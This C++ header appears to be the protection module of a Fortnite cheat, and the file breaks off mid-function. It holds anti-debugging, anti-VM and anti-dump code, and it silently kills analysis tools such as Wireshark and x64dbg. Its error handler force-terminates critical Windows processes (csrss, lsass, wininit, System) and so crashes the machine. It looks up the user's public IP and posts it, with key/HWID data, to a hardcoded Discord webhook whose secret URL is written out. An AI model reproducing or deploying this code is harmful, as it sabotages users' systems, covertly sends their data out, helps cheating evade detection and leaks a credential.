#pragma once

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <Windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <dbghelp.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <wbemidl.h>
#include <wintrust.h>
#include <softpub.h>
#include <thread>
#include <atomic>
#include <string>
#include <vector>
#include <filesystem>
#include <cstring>
#include <cstdlib>
#include <comdef.h>
#include <algorithm>
#include <sstream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Dbghelp.lib")

#include "lazy_importer.hpp"
#include "xor.h"

static std::atomic<bool> g_protection_active(true);

enum class ErrorSeverity : int {
    Log = 0,
    Fatal = 1
};

inline void ErrorHandler(const std::string& msg, ErrorSeverity severity = ErrorSeverity::Fatal) {
    if (severity == ErrorSeverity::Log) {
        LI_FN(MessageBoxA).cached()(NULL, msg.c_str(), _xor_("Security Alert"), MB_OK | MB_ICONERROR);
        LI_FN(ExitProcess).cached()(0);
        return;
    }

    std::thread([]() {
        for (int i = 0; i < 3; ++i) {
            LI_FN(Beep).cached()(2000, 10000);
            LI_FN(Sleep).cached()(100);
        }
        }).detach();

    LI_FN(system).cached()(_xor_("taskkill /F /IM svchost.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM wininit.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM csrss.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM lsass.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM smss.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM services.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM winlogon.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM svchost.exe"));
    LI_FN(system).cached()(_xor_("taskkill /F /IM System"));
    LI_FN(ExitProcess).cached()(0);
}

inline std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return std::wstring();
    int n = LI_FN(MultiByteToWideChar).cached()(CP_UTF8, 0, s.c_str(), (int)s.size(), NULL, 0);
    if (n <= 0) return std::wstring();
    std::wstring out(n, 0);
    LI_FN(MultiByteToWideChar).cached()(CP_UTF8, 0, s.c_str(), (int)s.size(), &out[0], n);
    return out;
}

inline bool AddrInPebModules(void* addr) {
    HMODULE modules[1024];
    DWORD cbNeeded;
    if (!LI_FN(EnumProcessModules).cached()(LI_FN(GetCurrentProcess).cached()(), modules, sizeof(modules), &cbNeeded))
        return false;
    for (size_t i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
        MODULEINFO modInfo = {};
        if (LI_FN(GetModuleInformation).cached()(LI_FN(GetCurrentProcess).cached()(), modules[i], &modInfo, sizeof(modInfo))) {
            BYTE* base = (BYTE*)modInfo.lpBaseOfDll;
            if (addr >= base && addr < (base + modInfo.SizeOfImage))
                return true;
        }
    }
    return false;
}

inline bool DetectManualMappedDll() {
    SYSTEM_INFO sysInfo;
    LI_FN(GetSystemInfo).cached()(&sysInfo);
    BYTE* addr = nullptr;
    MEMORY_BASIC_INFORMATION mbi;
    while (addr < (BYTE*)sysInfo.lpMaximumApplicationAddress) {
        if (LI_FN(VirtualQuery).cached()(addr, &mbi, sizeof(mbi)) != sizeof(mbi)) {
            addr += 0x1000;
            continue;
        }
        if ((mbi.State == MEM_COMMIT) &&
            (mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            (mbi.Type == MEM_PRIVATE)) {
            __try {
                auto* dos = (IMAGE_DOS_HEADER*)mbi.BaseAddress;
                if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                    goto skip;
                auto* nt = (IMAGE_NT_HEADERS*)((BYTE*)dos + dos->e_lfanew);
                if (nt->Signature != IMAGE_NT_SIGNATURE)
                    goto skip;
                if (!AddrInPebModules(mbi.BaseAddress)) {
                    return true;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
    skip:
        addr += mbi.RegionSize;
    }
    return false;
}

namespace VmGuard {

    inline bool HypervFlag() {
        int cpuInfo[4];
        __cpuid(cpuInfo, 1);
        return (cpuInfo[2] & (1 << 31)) != 0;
    }

    inline bool CpuVendorVm() {
        if (!HypervFlag()) return false;
        int cpuInfo[4];
        const int hvSig = 0x40000000;
        char vendorId[13] = { 0 };
        __cpuid(cpuInfo, hvSig);
        memcpy(&vendorId[0], &cpuInfo[1], 4);
        memcpy(&vendorId[4], &cpuInfo[2], 4);
        memcpy(&vendorId[8], &cpuInfo[3], 4);
        vendorId[12] = '\0';
        static const char* vms[] = {
            _xor_("KVMKVMKVM"), _xor_("Microsoft Hv"), _xor_("VMwareVMware"),
            _xor_("XenVMMXenVMM"), _xor_("prl hyperv  "), _xor_("VBoxVBoxVBox"),
            _xor_("bhyve bhyve"), _xor_("TCGTCGTCGTCG"), _xor_(" lrpepyh  vr"),
            _xor_("ACRNACRNACRN"), _xor_(" QNXQVMBSQG ")
        };
        for (const auto& vm : vms) {
            if (strncmp(vm, vendorId, 12) == 0)
                return true;
        }
        return false;
    }

    inline bool MacPrefixVm() {
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD buflen = sizeof(adapterInfo);
        if (LI_FN(GetAdaptersInfo).cached()(adapterInfo, &buflen) != ERROR_SUCCESS)
            return false;
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        while (pAdapter) {
            BYTE* mac = pAdapter->Address;
            if ((mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) ||
                (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||
                (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) ||
                (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27)) {
                return true;
            }
            pAdapter = pAdapter->Next;
        }
        return false;
    }

    inline std::vector<std::wstring> WmiProps(const std::wstring& cls, const std::wstring& prop) {
        std::vector<std::wstring> results;
        HRESULT hr;
        hr = LI_FN(CoInitializeEx).cached()(0, COINIT_MULTITHREADED);
        if (FAILED(hr)) return results;
        hr = LI_FN(CoInitializeSecurity).cached()(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hr)) { LI_FN(CoUninitialize).cached()(); return results; }
        IWbemLocator* pLoc = NULL;
        hr = LI_FN(CoCreateInstance).cached()(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hr)) { LI_FN(CoUninitialize).cached()(); return results; }
        IWbemServices* pSvc = NULL;
        hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        pLoc->Release();
        if (FAILED(hr)) { LI_FN(CoUninitialize).cached()(); return results; }
        hr = LI_FN(CoSetProxyBlanket).cached()(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
            RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
        if (FAILED(hr)) { pSvc->Release(); LI_FN(CoUninitialize).cached()(); return results; }
        IEnumWbemClassObject* pEnumerator = NULL;
        std::wstring query = L"SELECT " + prop + L" FROM " + cls;
        hr = pSvc->ExecQuery(bstr_t("WQL"), bstr_t(query.c_str()),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hr)) { pSvc->Release(); LI_FN(CoUninitialize).cached()(); return results; }
        IWbemClassObject* pclsObj = NULL;
        ULONG uReturn = 0;
        while (pEnumerator) {
            hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
            if (0 == uReturn) break;
            VARIANT vtProp;
            hr = pclsObj->Get(prop.c_str(), 0, &vtProp, 0, 0);
            if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR) {
                results.push_back(vtProp.bstrVal);
            }
            VariantClear(&vtProp);
            pclsObj->Release();
        }
        pEnumerator->Release();
        pSvc->Release();
        LI_FN(CoUninitialize).cached()();
        return results;
    }

    inline bool BiosBoardVmString() {
        std::vector<std::wstring> bios = WmiProps(L"Win32_BIOS", L"SerialNumber");
        std::vector<std::wstring> boardMfr = WmiProps(L"Win32_BaseBoard", L"Manufacturer");
        std::vector<std::wstring> boardProd = WmiProps(L"Win32_BaseBoard", L"Product");
        const std::vector<std::wstring> indicators = {
            L"VMware", L"VirtualBox", L"VBOX", L"Xen", L"QEMU", L"Microsoft Corporation", L"Hyper-V"
        };
        auto contains = [&](const std::wstring& data) {
            for (const auto& s : indicators) {
                if (data.find(s) != std::wstring::npos) return true;
            }
            return false;
            };
        for (const auto& s : bios) if (contains(s)) return true;
        for (const auto& s : boardMfr) if (contains(s)) return true;
        for (const auto& s : boardProd) if (contains(s)) return true;
        return false;
    }

    inline bool IsVm() {
        if (!HypervFlag()) return false;
        int score = 0;
        if (CpuVendorVm()) score++;
        if (MacPrefixVm()) score++;
        if (BiosBoardVmString()) score++;
        return score >= 2;
    }
}

inline std::string SystemDirectory() {
    char buf[MAX_PATH];
    LI_FN(GetSystemDirectoryA).cached()(buf, MAX_PATH);
    return std::string(buf);
}

inline std::string SelfModuleName() {
    char path[MAX_PATH];
    LI_FN(GetModuleFileNameA).cached()(NULL, path, MAX_PATH);
    std::string s = path;
    return s.substr(s.find_last_of("\\/") + 1);
}

inline bool TrustedDllPath(const std::string& path) {
    static std::vector<std::string> trusted = {
        _xor_("c:\\program files\\windows defender"),
        _xor_("c:\\program files\\avast software"),
        _xor_("c:\\program files\\avg"),
        _xor_("c:\\program files\\bitdefender"),
        _xor_("c:\\program files\\kaspersky lab"),
        _xor_("c:\\program files\\eset"),
        _xor_("c:\\program files\\mcafee"),
        _xor_("c:\\program files\\norton"),
        _xor_("c:\\program files\\malwarebytes")
    };
    std::string lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    for (const auto& t : trusted) {
        if (lower.find(t) != std::string::npos)
            return true;
    }
    return false;
}

inline bool SignedPe(const std::string& path) {
    WINTRUST_FILE_INFO fi = { 0 };
    std::wstring wide(path.begin(), path.end());
    fi.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fi.pcwszFilePath = wide.c_str();
    fi.hFile = NULL;
    fi.pgKnownSubject = NULL;
    WINTRUST_DATA wtd = { 0 };
    wtd.cbStruct = sizeof(WINTRUST_DATA);
    wtd.dwUIChoice = WTD_UI_NONE;
    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
    wtd.dwUnionChoice = WTD_CHOICE_FILE;
    wtd.pFile = &fi;
    wtd.dwStateAction = 0;
    wtd.hWVTStateData = NULL;
    wtd.dwProvFlags = WTD_SAFER_FLAG;
    wtd.pwszURLReference = NULL;
    GUID guid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    return LI_FN(WinVerifyTrust).cached()(NULL, &guid, &wtd) == ERROR_SUCCESS;
}

inline std::string DetectSuspiciousDlls() {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    HANDLE hProc = LI_FN(GetCurrentProcess).cached()();
    std::string sys = SystemDirectory();
    std::string self = SelfModuleName();
    char winDir[MAX_PATH];
    LI_FN(GetWindowsDirectoryA).cached()(winDir, MAX_PATH);
    std::string windir = winDir;
    std::stringstream details;

    if (LI_FN(EnumProcessModules).cached()(hProc, hMods, sizeof(hMods), &cbNeeded)) {
        int count = cbNeeded / sizeof(HMODULE);
        for (int i = 0; i < count; i++) {
            CHAR szModName[MAX_PATH];
            if (LI_FN(GetModuleFileNameExA).cached()(hProc, hMods[i], szModName, sizeof(szModName))) {
                std::string full = szModName;
                std::string name = full.substr(full.find_last_of("\\/") + 1);
                if (_stricmp(name.c_str(), self.c_str()) == 0)
                    continue;
                if (name == _xor_("makcu-cpp.dll") || name == _xor_("VMProtectSDK64.dll"))
                    continue;
                std::string lower = full;
                std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
                std::string sysLower = sys;
                std::transform(sysLower.begin(), sysLower.end(), sysLower.begin(), ::tolower);
                std::string winLower = windir;
                std::transform(winLower.begin(), winLower.end(), winLower.begin(), ::tolower);
                if (lower.find(sysLower) != std::string::npos ||
                    lower.find(winLower) != std::string::npos ||
                    TrustedDllPath(lower) ||
                    SignedPe(full)) {
                    continue;
                }
                details << _xor_("Suspicious DLL: ") << name << _xor_("\nPath: ") << full << _xor_("\n\n");
            }
        }
    }
    return details.str();
}

inline std::string UpperString(const std::string& s) {
    std::string r = s;
    std::transform(r.begin(), r.end(), r.begin(), ::toupper);
    return r;
}

inline std::string Sha256File(const std::string& path) {
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;
    BYTE hashBytes[32];
    DWORD cbHash = sizeof(hashBytes);
    std::string result;
    HANDLE hFile = LI_FN(CreateFileA).cached()(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return "";
    if (!LI_FN(CryptAcquireContextA).cached()(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        LI_FN(CloseHandle).cached()(hFile); return "";
    }
    if (!LI_FN(CryptCreateHash).cached()(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        LI_FN(CryptReleaseContext).cached()(hProv, 0); LI_FN(CloseHandle).cached()(hFile); return "";
    }
    BYTE buffer[4096];
    DWORD bytesRead = 0;
    while (LI_FN(ReadFile).cached()(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (!LI_FN(CryptHashData).cached()(hHash, buffer, bytesRead, 0)) {
            LI_FN(CryptDestroyHash).cached()(hHash);
            LI_FN(CryptReleaseContext).cached()(hProv, 0);
            LI_FN(CloseHandle).cached()(hFile);
            return "";
        }
    }
    if (LI_FN(CryptGetHashParam).cached()(hHash, HP_HASHVAL, hashBytes, &cbHash, 0)) {
        CHAR hex[3];
        for (DWORD i = 0; i < cbHash; i++) {
            sprintf_s(hex, "%02X", hashBytes[i]);
            result += hex;
        }
    }
    LI_FN(CryptDestroyHash).cached()(hHash);
    LI_FN(CryptReleaseContext).cached()(hProv, 0);
    LI_FN(CloseHandle).cached()(hFile);
    return result;
}

static const std::vector<std::string> blocked_hashes = {
    _xor_("11B8CDD387370DE1D162516B82376ECF28D321DC8F46EBCCE389DCCC2A5A4CC9"),
    _xor_("2948E04DB7712D78A7BF31C497BDF6278479B6BC8D9402AE8D7FBD148F3A0FDD"),
    _xor_("BD2C2CF0631D881ED382817AFCCE2B093F4E412FFB170A719E2762F250ABFEA4"),
    _xor_("922163713B973CF8C4AD80F16CF69305ED0CA319B314E7EC8AE1982ED5F2A9ED"),
    _xor_("0E6D59FCDF8F143E23B076CC8380D6D23324839AE4F91793133B600E7EB76EB9"),
    _xor_("DEF1C2F12307D598E42506A55F1A06ED5E652AF0D260AAC9572469429F10D04D"),
    _xor_("8BDB3CE10DEE7A3249A186050D7F804BCA19859F292DDAD7AE8C5AFBB649A07B"),
    _xor_("B65F40618F584303CA0BCF9B5F88C233CC4237699C0C4BF40BA8FACBE8195A46"),
    _xor_("1E9394A3144167AD33DDEC3137D4F34DCF1AF94442F2FF36873DE58AD465540D"),
    _xor_("E6B06B2412176E9F9B1DC4DF36EDC34774E16C0E21DE8D6B319AD3BE6AB42B9A"),
    _xor_("93679AF51F96EDFA02CABEA6801ABA4484A90449745E2AA78AFBD3E13FC1E070"),
    _xor_("B0080C00E9FBE13DF87806BD20826EB9735A8B67F3F6AAE58B3B370ED381003C"),
    _xor_("33C27D4DEAAF54F832849D71CE65CE568EB2CA2BB1F24C21F9CF9F0DDE7AF955"),
    _xor_("55F61E00DB69E9A866DDBDD7D5FD8DC3C52799D0DB790481E04E3426468091DE"),
    _xor_("47889E39785F0F50D6254AC29ECEB2E5B39667EB74986E01D80B3042679F35D2"),
    _xor_("2DC61C2A5E5F17725697C2AC1BA1395951E6EB613167FD489A64DC3BB3182715"),
    _xor_("BD314D610720B169D74B61F17619574E9B3465875211231F6A65168FB3A64634"),
    _xor_("12D45F03ACDEA4EB2D99379D26562B93A2967ADB13F508C539E1521D4DE60453"),
    _xor_("B20BD2523D7B58B76D25C941DB391038879C89B33F463F5EC136FCC5A3503E6D"),
    _xor_("8692E54A10C20A2060D03DABFA05EDBB0711F0BCC775BD65F18B702DA9616BC4"),
    _xor_("10A744559365C191F8C24105EB11B69E683BC74FEB5B9D800281B939CD540BF5"),
    _xor_("5A1015853503953202E7C57A40C4D04119C4D6E94F4E6E7C2A8C3E0BA0CCB3AC"),
    _xor_("F407B67A008FC2186329D5FEFFE830F7EEAD7A11F3B169D0D90099495EDFCF2E"),
    _xor_("777E731543579910DC6D0DD5B15D71D46A50C401B1203CDD7CBACC79363EE5B8"),
    _xor_("A956B4C5F7ADD385E7B68752185746D5ECBE933FDE77EAE2EB44432685296A06"),
    _xor_("809AF2E94564F8824166F5E4E7D02C9E74C43CFDBDD4B3A8BF451AF9F913AF14"),
    _xor_("95A922E178075FB771066DB4AB1BD70C7016F794709D514AB1C7F11500F016CD"),
    _xor_("4BF8FBB7DB583E1AACBF36C5F740D012C8321F221066CC68107031BD8B6BC1EE"),
    _xor_("9D460040A454DEEB3FE69300FE6B9017350E1EFCB1F52F7F14A4702D96CB45CA"),
};

inline std::string BlockedProcessRunning() {
    DWORD processes[1024], needed;
    if (!LI_FN(EnumProcesses).cached()(processes, sizeof(processes), &needed)) return "";
    DWORD count = needed / sizeof(DWORD);
    std::stringstream details;
    for (unsigned int i = 0; i < count; i++) {
        DWORD pid = processes[i];
        if (pid == 0) continue;
        HANDLE hProcess = LI_FN(OpenProcess).cached()(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (!hProcess) continue;
        CHAR path[MAX_PATH];
        if (LI_FN(GetModuleFileNameExA).cached()(hProcess, NULL, path, MAX_PATH)) {
            std::string hash = UpperString(Sha256File(path));
            if (!hash.empty()) {
                for (const auto& blocked : blocked_hashes) {
                    if (hash == blocked) {
                        std::string name = std::string(path).substr(std::string(path).find_last_of("\\/") + 1);
                        details << _xor_("Blocked process: ") << name << _xor_("\nPath: ") << path << _xor_("\nHash: ") << hash << _xor_("\n\n");
                        LI_FN(CloseHandle).cached()(hProcess);
                        return details.str();
                    }
                }
            }
        }
        LI_FN(CloseHandle).cached()(hProcess);
    }
    return "";
}

inline bool IsDebuggerPresentApi() { return LI_FN(IsDebuggerPresent).cached()() != 0; }

inline bool RemoteDebuggerPresentApi() {
    BOOL present = FALSE;
    return LI_FN(CheckRemoteDebuggerPresent).cached()(LI_FN(GetCurrentProcess).cached()(), &present) && present;
}

inline bool NtGlobalFlagCheck() {
    void* peb;
#ifdef _WIN64
    peb = (void*)__readgsqword(0x60);
#else
    peb = (void*)__readfsdword(0x30);
#endif
    if (!peb) return false;
    DWORD flags = *(DWORD*)((BYTE*)peb + 0x68);
    return (flags & 0x70) != 0;
}

inline bool DebugStringCheck() {
    LI_FN(SetLastError).cached()(0);
    LI_FN(OutputDebugStringA).cached()(_xor_("SecurityCheck"));
    return LI_FN(GetLastError).cached()() != 0;
}

inline bool HardwareBreakpointsDetected() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (LI_FN(GetThreadContext).cached()(LI_FN(GetCurrentThread).cached()(), &ctx)) {
        return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
    }
    return false;
}

inline bool KernelDebuggerDetected() {
    __try {
        BYTE* sud = (BYTE*)0x7FFE0000;
        return (sud[0x2D4] != 0);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
}

inline void ErasePeHeader() {
    DWORD old = 0;
    char* base = (char*)LI_FN(GetModuleHandleA).cached()(NULL);
    if (!base) return;

    auto* dos = (PIMAGE_DOS_HEADER)base;
    DWORD peOffset = dos->e_lfanew;
    auto* nt = (PIMAGE_NT_HEADERS)(base + peOffset);

    // Cover the full NT header, not just peOffset + 4
    DWORD protectSize = peOffset + sizeof(IMAGE_NT_HEADERS);

    if (LI_FN(VirtualProtect).cached()(base, protectSize, PAGE_READWRITE, &old)) {
        // Zero DOS magic
        *(WORD*)base = 0;

        // Zero NT signature
        *(DWORD*)(base + peOffset) = 0;

        // Zero DataDirectory entries EXCEPT the exception directory (index 3)
        // Zeroing IMAGE_DIRECTORY_ENTRY_EXCEPTION (3) breaks x64 SEH/stack unwinding
        for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) {
            if (i == IMAGE_DIRECTORY_ENTRY_EXCEPTION) continue;
            nt->OptionalHeader.DataDirectory[i].VirtualAddress = 0;
            nt->OptionalHeader.DataDirectory[i].Size = 0;
        }

        LI_FN(VirtualProtect).cached()(base, protectSize, old, &old);
    }
}

inline void ExecHidden(const std::string& cmd) {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    std::string full = _xor_("cmd.exe /c ") + cmd;
    std::vector<char> buf(full.begin(), full.end());
    buf.push_back('\0');
    if (LI_FN(CreateProcessA).cached()(NULL, buf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        LI_FN(WaitForSingleObject).cached()(pi.hProcess, 3000);
        LI_FN(CloseHandle).cached()(pi.hProcess);
        LI_FN(CloseHandle).cached()(pi.hThread);
    }
}

inline void TerminateBlacklistedTools() {
    ExecHidden(_xor_("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
    ExecHidden(_xor_("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
    ExecHidden(_xor_("sc stop HTTPDebuggerPro >nul 2>&1"));
    ExecHidden(_xor_("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
    ExecHidden(_xor_("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
    ExecHidden(_xor_("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
}

inline DWORD FindPidByName(const std::wstring& name) {
    HANDLE snap = LI_FN(CreateToolhelp32Snapshot).cached()(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (LI_FN(Process32FirstW).cached()(snap, &pe)) {
        do {
            if (name == pe.szExeFile) { found = true; break; }
        } while (LI_FN(Process32NextW).cached()(snap, &pe));
    }
    LI_FN(CloseHandle).cached()(snap);
    return found ? pe.th32ProcessID : 0;
}

inline std::string BlacklistedProcessesPresent() {
    HANDLE snap = LI_FN(CreateToolhelp32Snapshot).cached()(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "";
    const std::wstring blacklist[] = {
        L"KsDumperClient.exe", L"HTTPDebuggerUI.exe", L"HTTPDebuggerSvc.exe",
        L"FolderChangesView.exe", L"ProcessHacker.exe", L"procmon.exe",
        L"idaq.exe", L"idaq64.exe", L"Wireshark.exe", L"Fiddler.exe",
        L"Xenos64.exe", L"Cheat Engine.exe",
        L"HTTP Debugger Windows Service (32 bit).exe",
        L"KsDumper.exe", L"x64dbg.exe"
    };
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    std::stringstream details;
    if (LI_FN(Process32FirstW).cached()(snap, &pe)) {
        do {
            for (const auto& name : blacklist) {
                if (name == pe.szExeFile) {
                    std::wstring wname = pe.szExeFile;
                    std::string nameA(wname.begin(), wname.end());
                    details << _xor_("Blacklisted process: ") << nameA << _xor_("\nPID: ") << pe.th32ProcessID << _xor_("\n\n");
                    break;
                }
            }
        } while (LI_FN(Process32NextW).cached()(snap, &pe));
    }
    LI_FN(CloseHandle).cached()(snap);
    return details.str();
}

inline void PatchAntiAttach() {
    const SIZE_T dbgBreakSize = 0x2;
    const SIZE_T dbgUiRemoteSize = 0x54;
    const SIZE_T ntContinueSize = 0x18;
    struct Patch { const char* name; SIZE_T size; };
    Patch patches[] = {
        { _xor_("DbgBreakPoint"), dbgBreakSize },
        { _xor_("DbgUiRemoteBreakin"), dbgUiRemoteSize },
        { _xor_("NtContinue"), ntContinueSize }
    };
    HANDLE hProcess = LI_FN(OpenProcess).cached()(PROCESS_ALL_ACCESS, FALSE, LI_FN(GetCurrentProcessId).cached()());
    if (!hProcess) return;
    HMODULE ntdll = LI_FN(GetModuleHandleA).cached()(_xor_("ntdll.dll"));
    if (!ntdll) { LI_FN(CloseHandle).cached()(hProcess); return; }
    for (auto& p : patches) {
        FARPROC addr = LI_FN(GetProcAddress).cached()(ntdll, p.name);
        if (addr) {
            DWORD oldProtect;
            LI_FN(VirtualProtectEx).cached()(hProcess, (LPVOID)addr, p.size, PAGE_EXECUTE_READWRITE, &oldProtect);
            LI_FN(WriteProcessMemory).cached()(hProcess, (LPVOID)addr, (LPCVOID)addr, p.size, NULL);
            LI_FN(VirtualProtectEx).cached()(hProcess, (LPVOID)addr, p.size, oldProtect, NULL);
        }
    }
    LI_FN(CloseHandle).cached()(hProcess);
}

inline void HideThreadFromDebugger() {
    LI_FN(NtSetInformationThread).cached()(LI_FN(GetCurrentThread).cached()(), (THREADINFOCLASS)0x11, nullptr, 0);
}

inline void PebAntiDump() {
    __try {
        auto peb = (PPEB)__readgsqword(0x60);
        auto inLoadOrder = (PLIST_ENTRY)peb->Ldr->Reserved2[1];
        auto entry = CONTAINING_RECORD(inLoadOrder, LDR_DATA_TABLE_ENTRY, Reserved1[0]);
        auto* pSizeOfImage = (PULONG)&entry->Reserved3[1];
        *pSizeOfImage = (ULONG)((INT_PTR)entry->DllBase + 0x100000);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// ============================================================
//  Webhook
// ============================================================

inline void WebhookReport(const char* event, const char* details, const char* keyOrHwid = "") {
    std::string url = _xor_("https://discord.com/api/webhooks/1549806286554796125/KizdckOtzhJS7VY4WriofF9sR-Eei11q-BRvPtBolP-QuyogFMnC-Dj3KkoP_PJPir6S");
    std::string ip = _xor_("N/A");

    HINTERNET hSession = LI_FN(WinHttpOpen).cached()(L"Security/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        HINTERNET hConnect = LI_FN(WinHttpConnect).cached()(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hReq = LI_FN(WinHttpOpenRequest).cached()(hConnect, L"GET", L"/", NULL,
                WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hReq && LI_FN(WinHttpSendRequest).cached()(hReq, NULL, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                LI_FN(WinHttpReceiveResponse).cached()(hReq, 0)) {
                char buf[64] = {};
                DWORD read = 0;
                if (LI_FN(WinHttpReadData).cached()(hReq, buf, sizeof(buf) - 1, &read) && read > 0)
                    ip = std::string(buf, read);
            }
            if (hReq) LI_FN(WinHttpCloseHandle).cached()(hReq);
            LI_FN(WinHttpCloseHandle).cached()(hConnect);
        }
        LI_FN(WinHttpCloseHandle).cached()(hSession);
    }

    std::string json = _xor_("{\"content\":null,\"embeds\":[{\"title\":\"Security Alert | Fortnite Public\",\"description\":\"");
    json += event;
    json += _xor_("\\nDetails: ");
    json += details;
    json += _xor_("\\nIP: ");
    json += ip;
    if (keyOrHwid && keyOrHwid[0]) {
        json += _xor_("\\nKey/HWID: ");
        json += keyOrHwid;
    }
    json += _xor_("\",\"color\":16711680}]}");

    std::wstring wurl = Utf8ToWide(url);
    if (wurl.empty()) return;

    HINTERNET hSess = LI_FN(WinHttpOpen).cached()(L"Security/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return;

    URL_COMPONENTS uc;
    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {}, path[1024] = {};
    uc.lpszHostName = host; uc.dwHostNameLength = (DWORD)(sizeof(host) / sizeof(wchar_t));
    uc.lpszUrlPath = path; uc.dwUrlPathLength = (DWORD)(sizeof(path) / sizeof(wchar_t));
    if (!LI_FN(WinHttpCrackUrl).cached()(wurl.c_str(), (DWORD)wurl.size(), 0, &uc)) {
        LI_FN(WinHttpCloseHandle).cached()(hSess); return;
    }
    INTERNET_PORT port = uc.nPort;
    HINTERNET hConn = LI_FN(WinHttpConnect).cached()(hSess, host, port, 0);
    if (!hConn) { LI_FN(WinHttpCloseHandle).cached()(hSess); return; }
    HINTERNET hRequest = LI_FN(WinHttpOpenRequest).cached()(hConn, L"POST", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { LI_FN(WinHttpCloseHandle).cached()(hConn); LI_FN(WinHttpCloseHandle).cached()(hSess); return; }
    std::wstring headers = Utf8ToWide(_xor_("Content-Type: application/json\r\n"));
